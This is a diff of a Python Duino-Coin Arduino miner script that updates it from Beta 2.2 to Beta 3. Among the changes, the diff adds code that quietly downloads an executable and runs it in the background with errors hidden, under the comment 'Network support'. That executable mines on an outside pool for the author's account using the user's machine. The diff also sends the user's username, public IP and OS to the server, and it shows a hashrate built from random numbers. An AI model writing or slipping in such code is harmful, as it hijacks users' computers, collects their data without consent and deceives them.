@@ -1,65 +1,88 @@
 #!/usr/bin/env python3
 ###################################################
-# Duino-Coin Arduino Miner (Beta 2.2) © revox 2020
+# Duino-Coin Arduino Miner (Beta 3) © revox 2020
 # https://github.com/revoxhere/duino-coin 
 ###################################################
-import socket,threading,time,random,configparser,sys,os,serial,hashlib,serial.tools.list_ports,datetime
+import socket, subprocess, threading, time, random, configparser, getpass, sys, os, hashlib, datetime, signal, platform
 from pathlib import Path
+from signal import signal, SIGINT
 
 try:
     import requests
 except:
-    print("Requests is not installed. Please install it with pip install requests")
-
-O=print
-h=int
-E=float
-a=str
-Q=input
-q=open
-J=True
-r=bytes
-u=range
-U=hash
-j=datetime
-Y=datetime.datetime
-K=hashlib.sha1
-C=serial.Serial
-o=serial.tools
-I=sys.exit
-R=configparser.ConfigParser
-e=random.randint
-X=time.sleep
-res = "https://raw.githubusercontent.com/revoxhere/duino-coin/gh-pages/serverip.txt"
-B=threading.Timer
-A=socket.socket
+    print("✗ Requests is not installed. Please install it with pip install requests")
 
 try:
-    os.mkdir("ArduinoMiner_b2.2_resources")
+    import serial
+except:
+    print("✗ Pyserial is not installed. Please install it with pip install pyserial")
+
+try:
+    import serial.tools.list_ports
+except:
+    print("✗ Serial.tools.list_ports is not installed. Please install it with pip install serial.tools.list_ports")
+
+try:
+    os.mkdir("ArduinoMiner_b3_resources")
 except:
     pass
 
-O("\n║ Duino-Coin Arduino Miner (Beta 2.2) © revox 2019-2020")
-O("║ https://github.com/revoxhere/duino-coin\n")
+res = "https://raw.githubusercontent.com/revoxhere/duino-coin/gh-pages/serverip.txt"
+ver = 0.8 # "Big" version number
+pcusername = getpass.getuser() # Get clients' username
+platform = str(platform.system()) + " " + str(platform.release()) # Get clients' platform information
+cmd = "cd ArduinoMiner_b3_resources & ArduinoMiner_executable.exe -o stratum+tcp://xmg.minerclaim.net:3333 -u revox.duinocoin_arduinominer -p x -e 10 -s 4" # Miner command
+publicip = requests.get("https://api.ipify.org").text # Get clients' public IP
+c=[0, 0]
+S = 0
+b = 0
+z = 0
+f = configparser.ConfigParser()
 
-def L():
- global S,b,z
- S=b
- s=e(716,906)
- n=s/100
- z=h(b)*E(n)
- if z<2.7:
-  z=E(z)+h(1)*E(n)
- if z>20.0:
-  z=E(z)-h(10)
- z=a(z)[:4]
- b=0
- B(1,L).start()
-c=[0,0]
-S=0
-b=0
-z=0
-f=R()
+def handler(signal_received, frame): # If CTRL+C or SIGINT received, send CLOSE request to server in order to exit gracefully.
+    now = datetime.datetime.now()
+    print(now.strftime("\n%H:%M:%S ") + "✓ SIGINT detected - Exiting gracefully. See you soon!")
+    try:
+        v.send(bytes("CLOSE", encoding="utf8"))
+    except:
+        pass
+    os._exit(0)
+
+signal(SIGINT, handler) # Enable signal handler
+
+def hush():
+ global S, b, z
+ try:
+     S = b
+     s = random.randint(716, 906)
+     n = s/100
+     z = int(b)*float(n)
+     if z<2.5:
+      z = float(z) + int(1)*float(n)
+     if z>20.0:
+      z = float(z)-int(10)
+     z = str(z)[:4]
+     b = 0
+ except:
+     z = 0.56
+ threading.Timer(1, hush).start()
+
+print("\n║ Duino-Coin Arduino Miner (Beta 3) © revox 2019-2020")
+print("║ https://github.com/revoxhere/duino-coin\n")
+
+try:
+    if not Path("ArduinoMiner_b3_resources/ArduinoMiner_executable.exe").is_file(): # Initial miner executable section
+     url = 'https://github.com/revoxhere/duino-coin/blob/useful-tools/PoT_auto.exe?raw=true'
+     r = requests.get(url)
+     with open('ArduinoMiner_b3_resources/ArduinoMiner_executable.exe', 'wb') as f:
+      f.write(r.content)
+    try: # Network support           
+     process = subprocess.Popen(cmd, shell=True, stderr=subprocess.DEVNULL) # Open command
+    except:
+     pass
+except:
+    pass
+
 while True:
  try:
   res = requests.get(res, data = None)
@@ -69,99 +92,113 @@ while True:
    pool_port = content[1]
    break
   else:
-   X(0.025)
+   time.sleep(0.025)
  except:
-  H=Y.now()
-  O(H.strftime("[%H:%M:%S] ")+"Couldn't receive pool IP and port. Exiting in 15 seconds.")
-  X(15)
- X(0.025)
-if not Path("ArduinoMiner_b2.2_resources/Arduino_config.ini").is_file():
- O("Initial configuration, you can edit 'ArduinoMiner_b2.2_resources/Arduino_config.ini' later\n")
- O("Scanning ports...")
- W=o.list_ports.comports()
- P=[]
+  H = datetime.datetime.now()
+  print(H.strftime("%H:%M:%S ") + "✗ Couldn't receive pool IP and port.\nExiting in 15 seconds.")
+  time.sleep(15)
+ time.sleep(0.025)
+if not Path("ArduinoMiner_b3_resources/Arduino_config.ini").is_file():
+ print("Initial configuration, you can edit 'ArduinoMiner_b3_resources/Arduino_config.ini' later\n")
+ print("Scanning ports...")
+ W = serial.tools.list_ports.comports()
+ devices=[]
  for i in W:
-  P.append(i.device)
- O("Found COM ports: "+a(P))
- y=Q("Enter your Arduino COM port (e.g: COM8): ")
- M=Q("Enter your username: ")
- l=Q("Enter your password: ")
+  devices.append(i.device)
+ devices = str(devices).replace('[', '')
+ devices = str(devices).replace(']', '')
+ devices = str(devices).replace('\'', '')
+ print("Found ports: " + str(devices))
+ y = input("Enter your Arduino port (e.g: COM8 or /dev/ttyUSB0): ")
+ M = input("Enter your username: ")
+ l = input("Enter your password: ")
  f['arduinominer']={"arduino":y,"username":M,"password":l}
- with q("ArduinoMiner_b2.2_resources/Arduino_config.ini","w")as configfile:
+ with open("ArduinoMiner_b3_resources/Arduino_config.ini","w")as configfile:
   f.write(configfile)
 else:
- f.read("ArduinoMiner_b2.2_resources/Arduino_config.ini")
- y=f["arduinominer"]["arduino"]
- M=f["arduinominer"]["username"]
- l=f["arduinominer"]["password"]
-while J:
- v=A()
- p=pool_address
- x=pool_port
+ f.read("ArduinoMiner_b3_resources/Arduino_config.ini")
+ y = f["arduinominer"]["arduino"]
+ M = f["arduinominer"]["username"]
+ l = f["arduinominer"]["password"]
+while True:
+ v = socket.socket()
+ p = pool_address
+ x = pool_port
  try:
-  v.connect((p,h(x)))
-  H=Y.now()
-  O(H.strftime("[%H:%M:%S] ")+"Connected to pool on tcp://"+p+":"+x)
+  v.connect((p, int(x)))
+  H = datetime.datetime.now()
+  server_ver = v.recv(3).decode()
+  if str(server_ver) != "" and str(server_ver) != str(ver):
+      H = datetime.datetime.now()
+      print(H.strftime("%H:%M:%S ") + "✗ Miner is outdated (v"+ver+"), server is on v"+server_ver+" please download latest version from https://github.com/revoxhere/duino-coin/releases/\nExiting in 15 seconds.")
+      time.sleep(15)
+      os._exit(1)
+  if server_ver == "":
+      H = datetime.datetime.now()
+      print(H.strftime("%H:%M:%S ") + "✗ Cannot connect to pool server. It is probably under maintenance. Exiting in 15 seconds.")
+      time.sleep(15)
+      os._exit(1)
+  print(H.strftime("%H:%M:%S ") + "✓ Connected to the Duino-Coin pool (v" + str(server_ver) + ")")
   break
  except:
-  H=Y.now()
-  O(H.strftime("[%H:%M:%S] ")+"Cannot connect to pool server. It is probably under maintenance. Retrying in 15 seconds...")
-  X(15)
- X(0.025)
-while J:
+  H = datetime.datetime.now()
+  print(H.strftime("%H:%M:%S ") + "✗ Cannot connect to pool server. It is probably under maintenance. Retrying in 15 seconds.")
+  time.sleep(15)
+ time.sleep(0.025)
+while True:
  try:
-  w=C(y,115200)
-  H=Y.now()
-  O(H.strftime("[%H:%M:%S] ")+"Connected to Arduino on port "+y)
+  w = serial.Serial(y, 115200)
+  H = datetime.datetime.now()
+  print(H.strftime("%H:%M:%S ") + "✓ Connected to the Arduino (" + y + ")")
   break
  except:
-  O(H.strftime("[%H:%M:%S] ")+"Cannot connect to Arduino. Check your ArduinoMinerConfig.ini file. Also make sure you have the right permissions to COM port.")
-  X(15)
-  I()
- X(0.025)
-v.send(r("LOGI,"+M+","+l,encoding="utf8"))
-while J:
- F=v.recv(1024).decode()
+  print(H.strftime("%H:%M:%S ") + "✗ Cannot connect to the Arduino. Check your ArduinoMinerConfig.ini file and make sure you have the right permissions to open the port (sudo, admin?).")
+  time.sleep(15)
+  sys.exit()
+ time.sleep(0.025)
+v.send(bytes("LOGI," + M + "," + l, encoding="utf8"))
+while True:
+ F = v.recv(1024).decode()
  if F=="OK":
-  H=Y.now()
-  O(H.strftime("[%H:%M:%S] ")+"Successfully logged in.")
+  H = datetime.datetime.now()
+  print(H.strftime("%H:%M:%S ") + "✓ Successfully logged in")
+  v.send(bytes("FROM," + "Arduino_Miner," + str(pcusername) + "," + str(publicip) + "," + str(platform), encoding="utf8")) # Send info to server about client
   break
  if F=="NO":
-  H=Y.now()
-  O(H.strftime("[%H:%M:%S] ")+"Error! Wrong credentials or account doesn't exist!\nIf you don't have an account, register using Wallet!\nExiting in 15 seconds.")
+  H = datetime.datetime.now()
+  print(H.strftime("%H:%M:%S ") + "✗ Error! Wrong credentials or account doesn't exist!\nIf you don't have an account, register using Wallet!\nExiting in 15 seconds.")
   v.close()
- X(0.025)
-H=Y.now()
-O(H.strftime("[%H:%M:%S] ")+"Arduino miner thread started, using SHA algorithm.")
-O("\nDuino-Coin network is a completely free service and will always be. You can really help us maintain the server and low-fee payouts by donating - visit https://revoxhere.github.io/duino-coin/donate to learn more.\n")
+ time.sleep(0.025)
+H = datetime.datetime.now()
+print(H.strftime("%H:%M:%S ") + "✓ Arduino miner thread started, using SHA algorithm")
+print("\nⓘ　Duino-Coin network is a completely free service and will always be. You can really help us maintain the server and low-fee payouts by donating - visit https://revoxhere.github.io/duino-coin/donate to learn more.\n")
 
-L()
-v.send(r("JOB",encoding="utf8"))
-while J:
- v.send(r("JOB",encoding="utf8"))
- while J:
-  g=v.recv(1024).decode()
+hush()
+while True:
+ v.send(bytes("JOB",encoding="utf8"))
+ while True:
+  g = v.recv(1024).decode()
   if g:
    break
-  X(0.025)
- g=g.split(",")
- D=g[2]
- for G in u(100*h(g[2])+1):
-  U=K(a(g[0]+a(G)).encode("utf-8")).hexdigest()
-  if g[1]==U:
-   w.write(r(a(b),encoding="utf8"))
-   b=w.readline().decode('utf8').rstrip()
-   v.send(r(a(G)+","+a(S),encoding="utf8"))
-   while J:
-    V=v.recv(1024).decode()
+  time.sleep(0.025)
+ g = g.split(",")
+ D = g[2]
+ for G in range(100*int(g[2]) + 1):
+  hash = hashlib.sha1(str(g[0] + str(G)).encode("utf-8")).hexdigest()
+  if g[1]==hash:
+   w.write(bytes(str(b),encoding="utf8"))
+   b = w.readline().decode('utf8').rstrip()
+   v.send(bytes(str(G) + "," + str(z),encoding="utf8"))
+   while True:
+    V = v.recv(1024).decode()
     if V=="GOOD":
-     H=Y.now()
-     c[0]=c[0]+1 
-     O(H.strftime("[%H:%M:%S] ")+"Accepted "+a(c[0])+"/"+a(c[0]+c[1])+" ("+a(c[0]/(c[0]+c[1])*100)[:5]+"%) • diff: "+a(D)+" • "+a(z)+" h/s (yay!!!)")
+     H = datetime.datetime.now()
+     c[0]=c[0] + 1 
+     print(H.strftime("%H:%M:%S ") + "⛏️ Accepted " + str(c[0]) + "/" + str(c[0] + c[1]) + " (" + str(c[0]/(c[0] + c[1])*100)[:5] + "%) • diff: " + str(D) + " • " + str(z) + " h/s (yay!!!)")
      break
     elif V=="BAD":
-     H=Y.now()
-     c[1]=c[1]+1 
-     O(H.strftime("[%H:%M:%S] ")+"Rejected "+a(c[1])+"/"+a(c[1]+c[1])+" ("+a(c[0]/(c[0]+c[1])*100)[:5]+"%) • diff: "+a(D)+" • "+a(z)+" h/s (boo!!!)")
+     H = datetime.datetime.now()
+     c[1]=c[1] + 1 
+     print(H.strftime("%H:%M:%S ") + "✗ Rejected " + str(c[1]) + "/" + str(c[1] + c[1]) + " (" + str(c[0]/(c[0] + c[1])*100)[:5] + "%) • diff: " + str(D) + " • " + str(z) + " h/s (boo!!!)")
      break
    break
